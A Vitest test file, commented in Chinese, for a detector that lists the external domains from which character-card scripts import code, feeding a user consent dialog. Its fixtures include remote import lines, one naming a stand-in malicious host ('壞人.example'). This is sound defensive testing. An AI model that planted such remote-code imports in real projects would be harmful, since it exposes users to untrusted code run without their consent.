import { describe, expect, it } from 'vitest';
import { allExternals, externalsOf, scriptsOf } from '../lib/cardScripts.ts';

/**
 * 🔴 **`externalsOf` 是 M13「乙」那道防線的量尺**（Peter 2026-08-26 裁定）。
 * 它漏掉一個外部 `import`，同意視窗就少問一次，使用者就在不知情下讓卡片從網路載了 code。
 * ⇒ 這裡的每一條都是「漏掉會怎樣」，不是「功能通不通」。
 *
 * 實測樣本：那張卡的「MVU Zod 腳本」全文就是一行
 * `import 'https://testingcf.jsdelivr.net/gh/MagicalAstrogy/MagVarUpdate/artifact/bundle.js'`
 */
describe('externalsOf —— 這段程式會去哪些網域抓 code', () => {
  it('🔴 實測樣本：一行 import 就是全部內容', () => {
    expect(
      externalsOf("import 'https://testingcf.jsdelivr.net/gh/MagicalAstrogy/MagVarUpdate/artifact/bundle.js'"),
    ).toEqual(['testingcf.jsdelivr.net']);
  });

  it('三種寫法都要抓到（漏一種就等於沒防）', () => {
    expect(externalsOf("import 'https://a.example/x.js'")).toEqual(['a.example']);
    expect(externalsOf("await import('https://b.example/x.js')")).toEqual(['b.example']);
    expect(externalsOf("import x from 'https://c.example/x.js'")).toEqual(['c.example']);
  });

  it('多個來源要去重並排序（同意視窗要列得出來）', () => {
    const code = "import 'https://a.example/1.js'\nimport 'https://b.example/2.js'\nimport 'https://a.example/3.js'";
    expect(externalsOf(code)).toEqual(['a.example', 'b.example']);
  });

  it('🔴 相對 import 不算外連 —— 擋過頭會讓每張卡都跳視窗，然後使用者就不看了', () => {
    expect(externalsOf("import './local.js'\nimport '../x/y.js'")).toEqual([]);
  });

  it('沒有 import 的腳本回空陣列', () => {
    expect(externalsOf('const x = 1; console.log(x)')).toEqual([]);
  });

  it('🔴 解析不了的網址要當成「有外連」，不是靜默放行', () => {
    expect(externalsOf("import 'https://'")).toEqual(['(無法解析的網址)']);
  });
});

describe('scriptsOf —— 盤點卡片自帶的腳本', () => {
  const payload = {
    scripts: [
      { name: 'MVU Zod 腳本', enabled: true, content: "import 'https://cdn.example/bundle.js'" },
      { name: '世界書切換', enabled: true, content: 'const a = 1'.repeat(100) },
      { name: '關掉的那支', enabled: false, content: 'x' },
    ],
  };

  it('盤點出名稱／開關／大小／外連，但**不含內容**', () => {
    const s = scriptsOf(payload);
    expect(s?.scripts).toHaveLength(3);
    expect(s?.scripts[0]).toEqual({
      name: 'MVU Zod 腳本',
      enabled: true,
      bytes: 38,
      externals: ['cdn.example'],
    });
    // 🔴 內容不可以被帶出來（2 MB 塞進角色 JSON 會拖垮每一次列表）
    expect(JSON.stringify(s)).not.toContain('const a = 1');
  });

  it('卡片作者標的 enabled 要照實回報 —— 那不是我們的同意，兩件事不要混', () => {
    expect(scriptsOf(payload)?.scripts.map((x) => x.enabled)).toEqual([true, true, false]);
  });

  it('allExternals 把全卡的外連網域收成一張清單（同意視窗照它問）', () => {
    expect(allExternals(scriptsOf(payload) as NonNullable<ReturnType<typeof scriptsOf>>)).toEqual([
      'cdn.example',
    ]);
  });

  it('🔴 內容變了指紋要變（卡片更新後要重新詢問，靠它比對）', () => {
    const a = scriptsOf(payload)?.hash;
    const b = scriptsOf({
      scripts: [{ name: 'MVU Zod 腳本', enabled: true, content: "import 'https://壞人.example/x.js'" }],
    })?.hash;
    expect(a).not.toBe(b);
    // 同樣的輸入要得到同樣的指紋（不然每次開啟都會重問）
    expect(scriptsOf(payload)?.hash).toBe(a);
  });

  it('🔴 認不得的形狀一律 null —— 卡片來自網路，猜錯的代價是執行到不該執行的東西', () => {
    expect(scriptsOf(undefined)).toBeNull();
    expect(scriptsOf(null)).toBeNull();
    expect(scriptsOf({})).toBeNull();
    expect(scriptsOf({ scripts: 'not-an-array' })).toBeNull();
    expect(scriptsOf({ scripts: [] })).toBeNull();
  });
});
